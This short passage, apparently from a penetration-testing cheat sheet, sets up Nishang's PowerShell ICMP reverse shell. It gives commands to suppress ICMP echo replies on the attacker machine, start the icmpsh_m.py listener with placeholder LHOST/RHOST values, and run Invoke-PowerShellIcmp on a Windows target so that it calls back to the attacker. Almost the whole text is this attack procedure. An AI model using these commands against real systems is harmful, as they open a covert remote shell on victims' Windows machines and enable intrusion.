Nishang PowerShellICMP requires a server-side piece called icmpsh_m.py, which is not included in the repo. It can be obtained here or in child page.

#make sure you ignore sending echo replies
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#start server on attacker
python icmpsh_m.py <LHOST> <RHOST>

#invoke shell, place at bottom of Invoke-PowerShellIcmp to exec automatically
Windows pswh > Invoke-PowerShellIcmp -IPAddress <LHOST>
